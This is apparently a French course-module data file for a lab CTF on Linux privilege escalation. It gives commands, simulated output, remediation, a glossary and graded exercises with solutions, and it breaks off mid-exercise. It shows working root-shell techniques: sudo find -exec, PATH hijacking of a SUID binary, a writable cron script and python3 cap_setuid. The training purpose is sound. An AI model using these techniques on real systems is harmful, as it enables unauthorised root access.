export default {
  id: 'm12',
  num: 12,
  title: "CTF 04 — Élévation de privilèges Linux",
  short: "CTF Privesc",
  icon: "🪜",
  xp: 650,
  duration: 130,
  summary: "Parcours CTF de post-exploitation Linux : pied d'appel, énumération locale, sudo, binaires SUID, tâches cron, capabilities et capture du flag root, avec remédiation.",
  objectives: [
    "Obtenir un premier accès à une cible Linux de laboratoire",
    "Énumérer systématiquement le système après un foothold",
    "Exploiter une mauvaise configuration sudo et un binaire SUID",
    "Détecter une tâche cron inscriptible et une capability dangereuse",
    "Capturer le flag root et documenter chaque étape",
    "Proposer un durcissement Linux vérifiable"
  ],
  blocks: [
    {
      t: 'callout', v: 'legal', title: "Cible Linux de laboratoire",
      x: "La machine <code>lin.ctf.lab</code> (10.10.10.50) est une VM de lab volontairement mal configurée. Les identifiants et flags sont fictifs. L'élévation de privilèges sur un système réel sans autorisation est une infraction, même si l'on ne fait que lire un fichier."
    },
    {
      t: 'p',
      x: "L'<strong>élévation de privilèges</strong> (privesc) consiste à passer d'un compte à faibles droits à un compte plus puissant, idéalement <code>root</code>. Sur Linux, elle repose rarement sur une faille du noyau : le plus souvent, c'est une <strong>mauvaise configuration</strong> — sudo trop permissif, binaire SUID, cron inscriptible, capability, service systemd ou fichier de configuration lisible."
    },
    {
      t: 'mini',
      items: [
        { v: 'cyan', h: 'Cible', p: "<code>lin.ctf.lab</code> → <code>10.10.10.50</code>. Ubuntu 22.04, SSH 22, service web de démonstration." },
        { v: 'amber', h: 'Flags', p: "<code>FLAG{PRIVESC_FOOTHOLD}</code>, <code>FLAG{PRIVESC_SUDO_ENUM}</code>, <code>FLAG{PRIVESC_SUID}</code>, <code>FLAG{PRIVESC_CRON}</code>, <code>FLAG{PRIVESC_CAP}</code>, <code>FLAG{PRIVESC_ROOT}</code>." },
        { v: 'lime', h: 'Objectif final', p: "Lire <code>/root/root.txt</code> et prouver l'accès root avec <code>id</code>." },
        { v: 'magenta', h: 'Règles', p: "Pas de persistance, pas de modification des fichiers système hors lab, pas de déni de service. Une preuve suffit." }
      ]
    },
    { t: 'h', x: "12.1 Étape 1 — Reconnaissance" },
    {
      t: 'p',
      x: "On identifie les services exposés. Un service web peut contenir des identifiants ou un indice ; SSH peut être la porte d'entrée si un mot de passe fuite. On enregistre tout dans un dossier de preuves."
    },
    {
      t: 'code', lang: 'bash', title: "Scan et découverte",
      x: `mkdir -p ~/ctf/linux/{evidence,notes,flags}
cd ~/ctf/linux
echo "10.10.10.50 lin.ctf.lab" | sudo tee -a /etc/hosts
nmap -sV -sC -p- 10.10.10.50 -oN evidence/nmap.txt
curl -s http://lin.ctf.lab/ -o evidence/home.html
grep -iE 'user|pass|ssh|dev|flag' evidence/home.html | head -20`
    },
    {
      t: 'term',
      title: "Services exposés",
      x: [
        { c: "nmap -sV -sC -p- 10.10.10.50", o: [
          "22/tcp  open ssh   OpenSSH 8.9p1 Ubuntu 3ubuntu0.6",
          "80/tcp  open http  nginx 1.18.0",
          "| http-title: LinLab — Portail interne",
          "Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel"
        ] },
        { c: "grep -iE 'user|pass|ssh|dev|flag' evidence/home.html", o: [
          "<!-- maintenance: compte dev / devlab2024 (à changer) -->",
          "<!-- FLAG{PRIVESC_FOOTHOLD} -->"
        ] }
      ]
    },
    {
      t: 'callout', v: 'warn', title: "Un commentaire HTML ne devrait jamais contenir d'identifiants",
      x: "Le lab expose un compte de maintenance et le flag du pied d'appel. En production, les commentaires oubliés et les fichiers de debug sont une cause fréquente de compromission. Le flag <code>FLAG{PRIVESC_FOOTHOLD}</code> valide la découverte, pas encore l'accès."
    },
    { t: 'h', x: "12.2 Étape 2 — Premier accès et stabilisation" },
    {
      t: 'p',
      x: "On se connecte en SSH avec le compte trouvé. On vérifie immédiatement l'identité, le groupe, le répertoire personnel et les fichiers accessibles. On note la version du noyau et de la distribution pour la suite de l'énumération."
    },
    {
      t: 'code', lang: 'bash', title: "Connexion et premiers repères",
      x: `ssh dev@10.10.10.50
# mot de passe : devlab2024

id
hostname
uname -a
cat /etc/os-release | head -3
ls -la ~
cat ~/user.txt`
    },
    {
      t: 'term',
      title: "Contexte du compte dev",
      x: [
        { c: "id", o: ["uid=1001(dev) gid=1001(dev) groups=1001(dev),27(sudo)"] },
        { c: "uname -a", o: ["Linux lin 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux"] },
        { c: "cat ~/user.txt", o: ["FLAG{PRIVESC_FOOTHOLD}"] }
      ]
    },
    {
      t: 'p',
      x: "Le compte <code>dev</code> appartient au groupe <code>sudo</code>. Cela ne signifie pas qu'il peut tout faire : la politique sudo peut être restreinte. On vérifie donc précisément ce qui est autorisé."
    },
    { t: 'h', x: "12.3 Étape 3 — Énumération locale systématique" },
    {
      t: 'p',
      x: "Après un foothold, on collecte : identité, sudo, SUID, capabilities, cron, services, fichiers inscriptibles et historique. On évite les scripts bruyants qui modifient le système. Chaque commande doit être comprise et justifiée."
    },
    {
      t: 'code', lang: 'bash', title: "Checklist d'énumération",
      x: `sudo -l
find / -perm -4000 -type f 2>/dev/null | tee ~/evidence/suid.txt
getcap -r / 2>/dev/null | tee ~/evidence/caps.txt
ls -la /etc/cron.d /etc/cron.daily 2>/dev/null
crontab -l 2>/dev/null
ss -tulpn 2>/dev/null | head -20
find / -writable -type f 2>/dev/null | grep -vE '^/proc|^/sys|^/tmp' | head -30`
    },
    {
      t: 'term',
      title: "Résultats de l'énumération",
      x: [
        { c: "sudo -l", o: [
          "User dev may run the following commands on lin:",
          "    (root) NOPASSWD: /usr/bin/find",
          "    (root) NOPASSWD: /usr/bin/less /var/log/*"
        ] },
        { c: "find / -perm -4000 -type f 2>/dev/null", o: [
          "/usr/lib/openssh/ssh-keysign",
          "/usr/bin/passwd",
          "/usr/bin/sudo",
          "/usr/local/bin/backup"
        ] },
        { c: "getcap -r / 2>/dev/null", o: ["/usr/bin/python3 = cap_setuid+ep"] }
      ]
    },
    {
      t: 'callout', v: 'tip', title: "Première piste : sudo find",
      x: "<code>find</code> autorisé en root est un vecteur classique : il peut exécuter une commande avec <code>-exec</code>. Comme il tourne via sudo, la commande hérite des droits root. C'est une configuration à bannir."
    },
    { t: 'h', x: "12.4 Étape 4 — Exploiter sudo find" },
    {
      t: 'p',
      x: "On lance <code>sudo find</code> avec <code>-exec</code> pour obtenir un shell root. On vérifie l'identité, puis on lit le flag associé à cette étape. On reste en lecture seule : pas de modification de fichiers."
    },
    {
      t: 'code', lang: 'bash', title: "Shell root via sudo find",
      x: `sudo find /tmp -maxdepth 0 -exec /bin/sh \\; -p

id
cat /root/sudo-flag.txt`
    },
    {
      t: 'term',
      title: "Flag sudo",
      x: [
        { c: "sudo find /tmp -maxdepth 0 -exec /bin/sh \\; -p", o: ["# id", "uid=0(root) gid=0(root) groups=0(root)"] },
        { c: "cat /root/sudo-flag.txt", o: ["FLAG{PRIVESC_SUDO_ENUM}"] }
      ]
    },
    {
      t: 'p',
      x: "La configuration <code>NOPASSWD: /usr/bin/find</code> donne en pratique un accès root complet. La correction consiste à ne jamais autoriser un binaire capable d'exécuter des commandes arbitraires, ou à le faire tourner sous un utilisateur dédié avec des arguments fixes."
    },
    { t: 'h', x: "12.5 Étape 5 — Binaire SUID personnalisé" },
    {
      t: 'p',
      x: "Le binaire <code>/usr/local/bin/backup</code> est SUID root. On examine ses chaînes et son comportement. Un binaire qui appelle <code>tar</code>, <code>cp</code> ou un chemin relatif sans contrôle peut être détourné. Ici, il exécute <code>/bin/tar</code> avec un chemin contrôlable."
    },
    {
      t: 'code', lang: 'bash', title: "Analyser le binaire SUID",
      x: `ls -l /usr/local/bin/backup
file /usr/local/bin/backup
strings -n 6 /usr/local/bin/backup | head -30
/usr/local/bin/backup --help 2>&1 | head`
    },
    {
      t: 'term',
      title: "Comportement du binaire",
      x: [
        { c: "ls -l /usr/local/bin/backup", o: ["-rwsr-xr-x 1 root root 16712 /usr/local/bin/backup"] },
        { c: "strings -n 6 /usr/local/bin/backup | head", o: [
          "/bin/tar -czf /var/backups/home.tgz /home",
          "backup: compression terminée"
        ] }
      ]
    },
    {
      t: 'p',
      x: "Le binaire lance <code>tar</code> sans chemin absolu. Si le répertoire courant est contrôlé et que <code>PATH</code> contient <code>.</code>, on peut fournir un faux <code>tar</code>. C'est un détournement de chemin classique. On vérifie d'abord <code>PATH</code>, puis on crée un faux binaire qui lance un shell."
    },
    {
      t: 'code', lang: 'bash', title: "Détourner tar via PATH",
      x: `echo "$PATH"
mkdir -p /tmp/evil && cd /tmp/evil
printf '#!/bin/sh\\n/bin/sh -p\\n' > tar
chmod +x tar
PATH=/tmp/evil:$PATH /usr/local/bin/backup
id
cat /root/suid-flag.txt`
    },
    {
      t: 'term',
      title: "Flag SUID",
      x: [
        { c: "PATH=/tmp/evil:$PATH /usr/local/bin/backup", o: ["# id", "uid=0(root) gid=0(root) groups=0(root)"] },
        { c: "cat /root/suid-flag.txt", o: ["FLAG{PRIVESC_SUID}"] }
      ]
    },
    {
      t: 'callout', v: 'danger', title: "SUID : le moindre privilège ne s'applique pas",
      x: "Un binaire SUID s'exécute avec les droits de son propriétaire, souvent root. Un seul binaire mal écrit annule des années de durcissement. En audit, on vérifie la liste des SUID après chaque déploiement et on supprime ceux qui ne sont pas strictement nécessaires."
    },
    { t: 'h', x: "12.6 Étape 6 — Tâche cron inscriptible" },
    {
      t: 'p',
      x: "On inspecte les tâches planifiées. Un script exécuté par root mais modifiable par un utilisateur est une porte dérobée légitime. On cherche les permissions <code>group</code> ou <code>other</code> en écriture sur un script appelé par cron."
    },
    {
      t: 'code', lang: 'bash', title: "Inspecter cron",
      x: `ls -la /etc/cron.d
cat /etc/cron.d/* 2>/dev/null
cat /etc/crontab
ls -la /opt/scripts 2>/dev/null`
    },
    {
      t: 'term',
      title: "Script cron vulnérable",
      x: [
        { c: "cat /etc/cron.d/maintenance", o: [
          "* * * * * root /opt/scripts/cleanup.sh >> /var/log/cleanup.log 2>&1"
        ] },
        { c: "ls -la /opt/scripts/cleanup.sh", o: ["-rwxrwxr-x 1 root dev 412 /opt/scripts/cleanup.sh"] }
      ]
    },
    {
      t: 'p',
      x: "Le script appartient au groupe <code>dev</code> et est inscriptible par ce groupe. On peut ajouter une commande qui copie le flag ou ouvre un shell. En lab, on se contente d'ajouter une commande de lecture qui écrit une preuve dans <code>/tmp</code>. On attend le prochain passage de la minute."
    },
    {
      t: 'code', lang: 'bash', title: "Exploiter le cron",
      x: `echo 'cp /root/cron-flag.txt /tmp/cron-flag && chmod 644 /tmp/cron-flag' >> /opt/scripts/cleanup.sh
sleep 65
cat /tmp/cron-flag`
    },
    {
      t: 'term',
      title: "Flag cron",
      x: [
        { c: "echo 'cp /root/cron-flag.txt /tmp/cron-flag' >> /opt/scripts/cleanup.sh", o: [] },
        { c: "sleep 65 && cat /tmp/cron-flag", o: ["FLAG{PRIVESC_CRON}"] }
      ]
    },
    {
      t: 'callout', v: 'warn', title: "Le cron est un vecteur silencieux",
      x: "Une tâche root qui exécute un script inscriptible permet une exécution répétée et discrète. La correction : propriétaire root, permissions <code>755</code>, répertoire non inscriptible, et vérification d'intégrité du script."
    },
    { t: 'h', x: "12.7 Étape 7 — Capabilities dangereuses" },
    {
      t: 'p',
      x: "Les capabilities donnent des privilèges précis à un binaire sans SUID complet. <code>cap_setuid+ep</code> sur Python permet de changer d'UID depuis un script, donc de devenir root. On vérifie les capabilities de tout le système avec <code>getcap</code>."
    },
    {
      t: 'code', lang: 'bash', title: "Exploiter python3 cap_setuid",
      x: `getcap /usr/bin/python3
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
id
cat /root/cap-flag.txt`
    },
    {
      t: 'term',
      title: "Flag capability",
      x: [
        { c: "getcap /usr/bin/python3", o: ["/usr/bin/python3 = cap_setuid+ep"] },
        { c: "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'", o: ["# id", "uid=0(root) gid=1001(dev) groups=1001(dev)"] },
        { c: "cat /root/cap-flag.txt", o: ["FLAG{PRIVESC_CAP}"] }
      ]
    },
    {
      t: 'p',
      x: "Une capability <code>cap_setuid</code> sur un interpréteur est équivalente à un accès root. On la retire avec <code>setcap -r</code>. Les capabilities doivent être auditées comme les SUID : elles sont souvent ajoutées pour un besoin ponctuel puis oubliées."
    },
    { t: 'h', x: "12.8 Étape 8 — Capture du flag root" },
    {
      t: 'p',
      x: "On est root. On lit le flag final, on vérifie l'identité et on note les preuves. On ne crée pas de compte, on ne modifie pas les mots de passe et on ne laisse pas de persistance. En mission réelle, on documente puis on nettoie avec le client."
    },
    {
      t: 'code', lang: 'bash', title: "Lire le flag root",
      x: `id
hostname
cat /root/root.txt | tee ~/flags/root.txt`
    },
    {
      t: 'term',
      title: "Flag final",
      x: [
        { c: "id", o: ["uid=0(root) gid=0(root) groups=0(root)"] },
        { c: "cat /root/root.txt", o: ["FLAG{PRIVESC_ROOT}"] }
      ]
    },
    { t: 'h', x: "12.9 Récapitulatif de la capture" },
    {
      t: 'table',
      head: ['Étape', 'Action', 'Flag'],
      rows: [
        ['1', "Trouver les identifiants dans le commentaire HTML", 'FLAG{PRIVESC_FOOTHOLD}'],
        ['2', "Se connecter en SSH avec dev", "Aucun flag — foothold"],
        ['3', "Énumérer sudo, SUID, cron et capabilities", "Aucun flag — cartographie"],
        ['4', "Exploiter sudo find", 'FLAG{PRIVESC_SUDO_ENUM}'],
        ['5', "Détourner le binaire SUID backup", 'FLAG{PRIVESC_SUID}'],
        ['6', "Modifier le script cron root", 'FLAG{PRIVESC_CRON}'],
        ['7', "Exploiter python3 cap_setuid", 'FLAG{PRIVESC_CAP}'],
        ['8', "Lire /root/root.txt", 'FLAG{PRIVESC_ROOT}']
      ]
    },
    { t: 'h', x: "12.10 Remédiation Linux" },
    {
      t: 'ul',
      x: [
        "Restreindre sudo à des commandes et arguments précis, sans joker ni binaire capable d'exécuter une commande (<code>find</code>, <code>vim</code>, <code>less</code>, <code>tar</code>).",
        "Auditer les binaires SUID après chaque déploiement et supprimer ceux qui ne sont pas indispensables.",
        "Protéger les scripts cron : propriétaire root, permissions <code>755</code>, répertoires non inscriptibles, vérification d'intégrité.",
        "Limiter les capabilities au strict nécessaire et les auditer avec <code>getcap -r /</code>.",
        "Appliquer le moindre privilège aux comptes de service et interdire les identifiants dans les commentaires, fichiers de debug ou dépôts.",
        "Activer la MFA sur SSH, désactiver l'authentification par mot de passe lorsque possible et restreindre les groupes autorisés.",
        "Surveiller les changements de SUID, de capabilities, de cron et les connexions SSH anormales.",
        "Maintenir le noyau et les paquets à jour, mais ne pas compter sur le patch seul : la configuration reste la première cause."
      ]
    },
    { t: 'h', x: "12.11 Fiches commandes privesc" },
    {
      t: 'cmdref',
      items: [
        {
          cmd: 'id / uname -a', tag: 'Contexte',
          what: "Affiche l'utilisateur, ses groupes, le noyau et la distribution.",
          gives: "Le niveau de privilège actuel et la version du système.",
          use: "Savoir qui l'on est et quelle version de noyau ou de distribution cibler.",
          syntax: 'id ; uname -a ; cat /etc/os-release',
          example: 'id && uname -a',
          read: "Un compte dans le groupe <code>sudo</code> n'est pas root : vérifiez toujours la politique réelle avec <code>sudo -l</code>."
        },
        {
          cmd: 'sudo -l', tag: 'Sudo',
          what: "Liste les commandes que l'utilisateur peut exécuter avec sudo.",
          gives: "Les binaires autorisés, les utilisateurs cibles et la présence de NOPASSWD.",
          use: "Identifier une commande root détournable ou une règle trop large.",
          syntax: 'sudo -l',
          example: 'sudo -l',
          read: "Cherchez les binaires qui permettent d'exécuter une commande ou d'éditer un fichier : find, less, vim, tar, awk, python. Une règle NOPASSWD est immédiatement exploitable."
        },
        {
          cmd: 'find -perm -4000', tag: 'SUID',
          what: "Recherche les fichiers qui ont le bit SUID.",
          gives: "La liste des binaires qui s'exécutent avec les droits de leur propriétaire.",
          use: "Repérer un binaire SUID root légitime ou personnalisé à analyser.",
          syntax: 'find / -perm -4000 -type f 2>/dev/null',
          example: 'find / -perm -4000 -type f 2>/dev/null',
          read: "Un binaire personnalisé dans <code>/usr/local/bin</code> est prioritaire. Analysez ses chaînes, ses appels système et son comportement avec <code>strace</code> ou <code>ltrace</code>."
        },
        {
          cmd: 'strings', tag: 'Analyse binaire',
          what: "Extrait les chaînes lisibles d'un binaire.",
          gives: "Les chemins, commandes et messages utilisés par le programme.",
          use: "Repérer un appel à <code>/bin/tar</code>, un chemin relatif ou une commande sans chemin absolu.",
          syntax: 'strings -n 6 binaire | head -50',
          example: 'strings -n 6 /usr/local/bin/backup',
          read: "Une commande sans chemin absolu peut être détournée via <code>PATH</code>. Vérifiez aussi les permissions du répertoire courant."
        },
        {
          cmd: 'getcap -r /', tag: 'Capabilities',
          what: "Liste les capabilities étendues de tous les fichiers accessibles.",
          gives: "Les binaires qui possèdent des privilèges précis, comme <code>cap_setuid</code>.",
          use: "Détecter un interpréteur ou un outil disposant de droits excessifs.",
          syntax: 'getcap -r / 2>/dev/null',
          example: 'getcap -r / 2>/dev/null',
          read: "<code>cap_setuid+ep</code> sur Python ou Perl permet de devenir root. <code>cap_dac_read_search</code> permet de lire tous les fichiers. Traitez ces capabilities comme des SUID."
        },
        {
          cmd: 'cron', tag: 'Tâches planifiées',
          what: "Affiche les tâches exécutées périodiquement par cron.",
          gives: "Les scripts, leurs horaires et l'utilisateur qui les exécute.",
          use: "Repérer un script root inscriptible par un utilisateur non privilégié.",
          syntax: 'cat /etc/crontab ; ls -la /etc/cron.d ; crontab -l',
          example: 'cat /etc/cron.d/maintenance',
          read: "Vérifiez les permissions du script et de son répertoire. Un script root inscriptible par le groupe <code>dev</code> est une élévation directe."
        },
        {
          cmd: 'ss -tulpn', tag: 'Réseau local',
          what: "Liste les ports en écoute et les processus associés.",
          gives: "Les services internes non exposés à l'extérieur.",
          use: "Découvrir un service local qui pourrait être mal configuré ou accessible sans authentification.",
          syntax: 'ss -tulpn',
          example: 'ss -tulpn | head -20',
          read: "Un service en écoute sur <code>127.0.0.1</code> n'est pas visible depuis Internet mais reste accessible depuis la machine compromise. C'est une cible de pivot."
        }
      ]
    },
    { t: 'h', x: "12.12 Glossaire privesc" },
    {
      t: 'glossary',
      items: [
        { term: 'Foothold', def: "Premier accès obtenu sur une machine, souvent avec un compte à faibles privilèges.", use: "À partir de là, énumérer pour trouver un vecteur d'élévation.", ex: 'shell dev via SSH' },
        { term: 'Privesc', full: 'Privilege Escalation', def: "Passage d'un compte à faibles droits à un compte plus puissant.", use: "Rechercher les mauvaises configurations avant les exploits de noyau.", ex: 'dev → root' },
        { term: 'SUID', full: 'Set User ID', def: "Bit qui fait exécuter un binaire avec les droits de son propriétaire.", use: "Un binaire SUID root mal écrit peut être détourné.", ex: '-rwsr-xr-x root root' },
        { term: 'Capability', def: "Privilège granulaire accordé à un binaire, sans donner tous les droits root.", use: "Auditer les capabilities dangereuses comme <code>cap_setuid</code>.", ex: 'cap_setuid+ep' },
        { term: 'Sudo', def: "Programme qui permet d'exécuter une commande avec les droits d'un autre utilisateur selon une politique.", use: "Lire <code>sudo -l</code> et chercher les binaires détournables.", ex: 'NOPASSWD: /usr/bin/find' },
        { term: 'Cron', def: "Planificateur de tâches qui exécute des commandes à intervalles réguliers.", use: "Un script root inscriptible est une exécution de code répétée.", ex: '* * * * * root /opt/scripts/cleanup.sh' },
        { term: 'PATH hijacking', def: "Détournement d'une commande sans chemin absolu en plaçant un faux binaire plus tôt dans le PATH.", use: "Exploiter un binaire qui appelle <code>tar</code> ou <code>cp</code> sans chemin complet.", ex: 'PATH=/tmp/evil:$PATH' },
        { term: 'NOPASSWD', def: "Option sudo qui permet d'exécuter une commande sans mot de passe.", use: "Réduire la friction mais augmenter l'impact en cas de compromission du compte.", ex: 'dev ALL=(root) NOPASSWD: /usr/bin/find' },
        { term: 'Moindre privilège', def: "Donner uniquement les droits nécessaires à une tâche.", use: "Limiter sudo, SUID, capabilities et accès aux scripts cron.", ex: 'un compte dédié par service' },
        { term: 'Persistance', def: "Mécanisme qui permet à un attaquant de revenir après un redémarrage.", use: "En lab, ne pas en déployer ; en audit, la rechercher et la documenter.", ex: 'cron, service, clé SSH ajoutée' },
        { term: 'Enumeration', def: "Collecte méthodique des informations locales : utilisateurs, droits, services, fichiers.", use: "C'est 80 % du privesc : comprendre avant d'exploiter.", ex: 'sudo -l, SUID, cron, capabilities' },
        { term: 'Durcissement', def: "Ensemble de configurations qui réduisent la surface d'attaque et l'impact.", use: "Auditer SUID, sudo, cron, capabilities et comptes de service.", ex: 'retirer SUID inutiles' }
      ]
    }
  ],
  exos: [
    {
      id: 'm12-e1',
      title: 'Scanner la cible Linux',
      context: "Vous démarrez le CTF sur <code>lin.ctf.lab</code> (10.10.10.50).",
      task: "Lancez un scan Nmap complet avec versions et scripts, et enregistrez la sortie dans <code>evidence/nmap.txt</code>.",
      hint: "Utilisez <code>nmap -sV -sC -p- 10.10.10.50 -oN evidence/nmap.txt</code>.",
      accept: [/nmap\s+-sV\s+-sC\s+-p-\s+10\.10\.10\.50\s+-oN\s+evidence\/nmap\.txt/i],
      solution: 'nmap -sV -sC -p- 10.10.10.50 -oN evidence/nmap.txt',
      output: [
        '22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6',
        '80/tcp open http nginx 1.18.0',
        '| http-title: LinLab — Portail interne'
      ],
      read: "SSH et HTTP sont exposés. Le portail web peut contenir des indices avant même de se connecter.",
      pivot: "Téléchargez la page d'accueil et cherchez des commentaires ou des identifiants."
    },
    {
      id: 'm12-e2',
      title: "Trouver les identifiants exposés",
      context: "La page d'accueil du portail contient peut-être des commentaires de maintenance.",
      task: "Téléchargez <code>http://lin.ctf.lab/</code> dans <code>evidence/home.html</code> et recherchez les lignes contenant <code>user</code>, <code>pass</code> ou <code>FLAG</code>.",
      hint: "Utilisez <code>curl -s -o evidence/home.html</code> puis <code>grep -iE 'user|pass|FLAG'</code>.",
      accept: [/curl\s+-s\s+http:\/\/lin\.ctf\.lab\/?\s+-o\s+evidence\/home\.html.*grep\s+-iE\s+["'].*user.*pass.*flag/i],
      solution: "curl -s http://lin.ctf.lab/ -o evidence/home.html && grep -iE 'user|pass|flag' evidence/home.html",
      output: [
        "<!-- maintenance: compte dev / devlab2024 (à changer) -->",
        "<!-- FLAG{PRIVESC_FOOTHOLD} -->"
      ],
      read: "Un commentaire HTML expose un compte de maintenance et le flag du foothold. Le mot de passe est en clair : c'est une erreur critique.",
      pivot: "Connectez-vous en SSH avec <code>dev:devlab2024</code> et commencez l'énumération locale."
    },
    {
      id: 'm12-e3',
      title: 'Se connecter et vérifier le contexte',
      context: "Vous avez trouvé le compte <code>dev</code> et son mot de passe de lab.",
      task: "Connectez-vous en SSH à <code>dev@10.10.10.50</code> et affichez le résultat de <code>id</code>.",
      hint: "Utilisez <code>ssh dev@10.10.10.50</code> puis <code>id</code>. Le mot de passe est <code>devlab2024</code>.",
      accept: [/ssh\s+dev@10\.10\.10\.50.*\bid\b/is],
      solution: 'ssh dev@10.10.10.50\nid',
      output: ['uid=1001(dev) gid=1001(dev) groups=1001(dev),27(sudo)'],
      read: "Le compte <code>dev</code> est membre du groupe <code>sudo</code>. Il faut vérifier la politique exacte : l'appartenance au groupe ne garantit pas un accès root complet.",
      pivot: "Lancez <code>sudo -l</code> pour lister les commandes autorisées."
    },
    {
      id: 'm12-e4',
      title: "Lister les droits sudo",
      context: "Le compte dev appartient au groupe sudo, mais la politique peut être restreinte.",
      task: "Exécutez <code>sudo -l</code> et repérez les commandes autorisées sans mot de passe.",
      hint: "La commande est simplement <code>sudo -l</code>.",
      accept: [/sudo\s+-l\b/],
      solution: 'sudo -l',
      output: [
        'User dev may run the following commands on lin:',
        '    (root) NOPASSWD: /usr/bin/find',
        '    (root) NOPASSWD: /usr/bin/less /var/log/*'
      ],
      read: "<code>find</code> est autorisé en root sans mot de passe. Ce binaire peut exécuter une commande avec <code>-exec</code>, ce qui donne un shell root.",
      pivot: "Exploitez <code>sudo find</code> avec <code>-exec /bin/sh</code> pour obtenir un shell privilégié."
    },
    {
      id: 'm12-e5',
      title: 'Exploiter sudo find',
      context: "La règle sudo autorise <code>/usr/bin/find</code> en root sans mot de passe.",
      task: "Lancez un shell root via <code>sudo find</code> et <code>-exec /bin/sh</code>, puis vérifiez l'identité.",
      hint: "Utilisez <code>sudo find /tmp -maxdepth 0 -exec /bin/sh \\; -p</code>.",
      accept: [/sudo\s+find\s+\S+\s+-maxdepth\s+0\s+-exec\s+\/bin\/sh\s+\\;?\s+-p/i],
      solution: 'sudo find /tmp -maxdepth 0 -exec /bin/sh \\; -p',
      output: ['uid=0(root) gid=0(root) groups=0(root)'],
      read: "Le shell hérite des droits root. La règle sudo est donc équivalente à un accès root complet, malgré l'apparence restrictive.",
      pivot: "Lisez le flag associé à sudo, puis explorez le SUID personnalisé pour comprendre un second vecteur."
    },
    {
      id: 'm12-e6',
      title: 'Lire le flag sudo',
      context: "Vous êtes root via sudo find. Le flag de l'étape est dans <code>/root/sudo-flag.txt</code>.",
      task: "Affichez le contenu de <code>/root/sudo-flag.txt</code>.",
      hint: "Une fois root, utilisez <code>cat /root/sudo-flag.txt</code>.",
      accept: [/cat\s+\/root\/sudo-flag\.txt/],
      solution: 'cat /root/sudo-flag.txt',
      output: ['FLAG{PRIVESC_SUDO_ENUM}'],
      read: "Le flag confirme l'élévation par sudo. La correction est de retirer les binaires capables d'exécuter des commandes de la politique sudo.",
      pivot: "Pour le scénario complet, reprenez le compte dev et analysez le binaire SUID <code>/usr/local/bin/backup</code>."
    },
    {
      id: 'm12-e7',
      title: 'Trouver les binaires SUID',
      context: "Un binaire SUID personnalisé peut offrir un autre chemin vers root.",
      task: "Recherchez tous les fichiers SUID du système et enregistrez la liste dans <code>evidence/suid.txt</code>.",
      hint: "Utilisez <code>find / -perm -4000 -type f 2>/dev/null | tee evidence/suid.txt</code>.",
      accept: [/find\s+\/\s+-perm\s+-4000\s+-type\s+f\s+2>\/dev\/null\s*\|\s*tee\s+evidence\/suid\.txt/i],
      solution: 'find / -perm -4000 -type f 2>/dev/null | tee evidence/suid.txt',
      output: [
        '/usr/lib/openssh/ssh-keysign',
        '/usr/bin/passwd',
        '/usr/bin/sudo',
        '/usr/local/bin/backup'
      ],
      read: "<code>/usr/local/bin/backup</code> est un binaire personnalisé. C'est la piste prioritaire : les binaires système standards sont rarement exploitables.",
      pivot: "Examinez ses chaînes pour comprendre quelles commandes il appelle."
    },
    {
      id: 'm12-e8',
      title: 'Analyser le binaire backup',
      context: "Vous devez comprendre le comportement du binaire SUID.",
      task: "Affichez ses permissions, son type et ses chaînes lisibles avec <code>strings -n 6</code>.",
      hint: "Utilisez <code>ls -l</code>, <code>file</code> et <code>strings -n 6 /usr/local/bin/backup</code>.",
      accept: [/(ls\s+-l\s+\/usr\/local\/bin\/backup|file\s+\/usr\/local\/bin\/backup).*strings\s+-n\s*6\s+\/usr\/local\/bin\/backup/is],
      solution: 'ls -l /usr/local/bin/backup && file /usr/local/bin/backup && strings -n 6 /usr/local/bin/backup | head -30',
      output: [
        '-rwsr-xr-x 1 root root 16712 /usr/local/bin/backup',
        '/bin/tar -czf /var/backups/home.tgz /home'
      ],
      read: "Le binaire appelle <code>/bin/tar</code> sans chemin absolu dans le cadre d'une exécution SUID root. Un détournement via <code>PATH</code> est possible.",
      pivot: "Créez un faux <code>tar</code> dans un répertoire contrôlé, puis lancez le binaire avec ce répertoire en tête de <code>PATH</code>."
    },
    {
      id: 'm12-e9',
      title: 'Détourner tar avec PATH',
      context: "Le binaire SUID appelle <code>tar</code> sans chemin absolu.",
      task: "Créez un faux <code>tar</code> qui lance <code>/bin/sh</code>, puis exécutez <code>/usr/local/bin/backup</code> avec <code>/tmp/evil</code> en tête de <code>PATH</code>.",
      hint: "Écrivez <code>#!/bin/sh</code> et <code>/bin/sh -p</code> dans <code>/tmp/evil/tar</code>, puis <code>PATH=/tmp/evil:$PATH /usr/local/bin/backup</code>.",
      accept: [/PATH=\/tmp\/evil:\$PATH\s+\/usr\/local\/bin\/backup/i],
      solution: 'mkdir -p /tmp/evil && printf \'#!/bin/sh\\n/bin/sh -p\\n\' > /tmp/evil/tar && chmod +x /tmp/evil/tar && PATH=/tmp/evil:$PATH /usr/local/bin/backup',
      output: ['uid=0(root) gid=0(root) groups=0(root)'],
      read: "Le faux <code>tar</code> est exécuté à la place du vrai, avec les droits SUID root. C'est un détournement de chemin classique.",
      pivot: "Lisez <code>/root/suid-flag.txt</code>, puis passez au vecteur cron."
    },
    {
      id: 'm12-e10',
      title: 'Inspecter les tâches cron',
      context: "Une tâche root peut exécuter un script inscriptible par le groupe dev.",
      task: "Affichez le contenu de <code>/etc/cron.d</code> et les permissions de <code>/opt/scripts/cleanup.sh</code>.",
      hint: "Utilisez <code>cat /etc/cron.d/*</code> et <code>ls -la /opt/scripts/cleanup.sh</code>.",
      accept: [/(cat\s+\/etc\/cron\.d\/\*|ls\s+-la\s+\/etc\/cron\.d).*ls\s+-la\s+\/opt\/scripts\/cleanup\.sh/is],
      solution: 'cat /etc/cron.d/* && ls -la /opt/scripts/cleanup.sh',
      output: [
        '* * * * * root /opt/scripts/cleanup.sh >> /var/log/cleanup.log 2>&1',
        '-rwxrwxr-x 1 root dev 412 /opt/scripts/cleanup.sh'
      ],
      read: "Le script est exécuté par root chaque minute et il est inscriptible par le groupe <code>dev</code>. C'est une élévation de privilèges directe.",
      pivot: "Ajoutez une commande de lecture vers <code>/tmp</code> et attendez le prochain passage de cron."
    },
    {
      id: 'm12-e11',
      title: 'Exploiter le cron root',
      context: "Le script <code>cleanup.sh</code> est inscriptible et exécuté par root.",
